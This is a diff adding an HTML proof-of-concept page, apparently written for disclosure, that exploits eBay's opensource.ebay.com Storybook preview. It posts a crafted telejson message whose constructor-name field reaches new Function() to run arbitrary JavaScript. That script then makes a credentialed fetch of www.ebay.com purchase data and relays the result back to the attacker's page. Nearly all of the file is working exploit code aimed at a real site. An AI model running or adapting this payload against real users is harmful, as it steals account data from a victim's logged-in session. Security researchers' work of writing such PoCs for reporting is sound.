@@ -1,0 +1,72 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>eBay opensource Storybook telejson postMessage DOM-XSS + CORS chain PoC</title>
+<style>
+  body{font-family:system-ui,Arial,sans-serif;max-width:860px;margin:30px auto;padding:0 16px;line-height:1.5;background:#0f1115;color:#e8eaed}
+  h1{font-size:20px} code{background:#1b1f27;color:#ffd479;padding:1px 5px;border-radius:4px}
+  #out{white-space:pre-wrap;background:#0b0d11;border:1px solid #232833;border-radius:8px;padding:14px;margin-top:14px;color:#9be89b;font:13px/1.6 ui-monospace,Menlo,Consolas,monospace;min-height:120px}
+  .ok{color:#7CFC7C;font-weight:700}
+  .n{color:#9aa4b2;font-size:14px}
+  button{font:inherit;font-weight:700;padding:12px 24px;border:0;border-radius:8px;background:#e53238;color:#fff;cursor:pointer}
+</style>
+</head>
+<body>
+<h1>eBay <code>opensource.ebay.com</code> Storybook &mdash; telejson <code>postMessage</code> DOM-XSS &rarr; credentialed <code>www.ebay.com</code> read</h1>
+<p class="n">Click the button. It opens eBay's Storybook preview in a new window and posts one telejson payload whose
+<code>_constructor-name_</code> reaches <code>new Function(...)</code> &mdash; arbitrary JS runs in the
+<code>opensource.ebay.com</code> origin, shows an <code>alert()</code> there, then reads <code>www.ebay.com</code> account
+data via the ACAO+credentials trust and reports it back here.</p>
+
+<button id="go">Open eBay Storybook &amp; run payload</button>
+<div id="out">idle — click the button.</div>
+
+<script>
+(function(){
+  var out = document.getElementById('out');
+  function log(s, ok){ if(out.textContent==='idle — click the button.') out.textContent=''; out.innerHTML += (ok?'<span class="ok">':'<span>') + s + '</span>\n'; }
+
+  // Runs INSIDE opensource.ebay.com. Sink body is `return function <NAME>(){}`, so the code must be a
+  // truthy expression evaluated via && between two truthy function expressions (not after the return).
+  var INNER =
+    "(function(){" +
+      "try{" +
+        "var tag='PWNED '+location.origin+' ('+document.domain+')';" +
+        "opener&&opener.postMessage('XSS::'+tag,'*');" +     // report execution first (before the blocking alert)
+        "fetch('https://www.ebay.com/mye/myebay/ajax/v2/purchase/get',{credentials:'include'})" +
+          ".then(function(r){return r.text()})" +
+          ".then(function(t){opener&&opener.postMessage('EBAYDATA::'+t.slice(0,400),'*')})" +
+          ".catch(function(e){opener&&opener.postMessage('EBAYERR::'+e,'*')});" +
+        "alert(tag);" +                                      // single visible proof in the eBay origin
+      "}catch(e){opener&&opener.postMessage('INNERERR::'+e,'*')}" +
+      "return 1;" +
+    "}())";
+  var NAME = "x(){}&&" + INNER + "&&function z";
+  var MSG  = JSON.stringify({ key:'storybook-channel', event:{ type:'t', args:[ { "_constructor-name_": NAME } ] } });
+
+  var fired = false;
+  document.getElementById('go').onclick = function(){
+    var w = window.open('https://opensource.ebay.com/skin-react/iframe.html','_blank');  // new TAB (no popup feature string)
+    if(!w){ log('popup blocked — allow popups and click again.'); return; }
+    log('opened opensource.ebay.com Storybook; posting payload…');
+    var n=0, t=setInterval(function(){
+      if(w.closed || fired){ clearInterval(t); return; }
+      try{ w.postMessage(MSG,'*'); }catch(e){}
+      if(++n>20) clearInterval(t);     // give the preview time to mount its message listener
+    }, 500);
+  };
+
+  window.addEventListener('message', function(e){
+    if(e.origin!=='https://opensource.ebay.com') return;
+    var d=String(e.data||'');
+    if(d.indexOf('XSS::')===0){ fired=true; log('[JS EXECUTED in opensource.ebay.com] '+d.slice(5), true); }
+    else if(d.indexOf('EBAYDATA::')===0) log('[www.ebay.com credentialed read] '+d.slice(10), true);
+    else if(d.indexOf('EBAYERR::')===0)  log('[fetch error] '+d.slice(9));
+    else if(d.indexOf('INNERERR::')===0) log('[inner error] '+d.slice(10));
+  });
+})();
+</script>
+</body>
+</html>
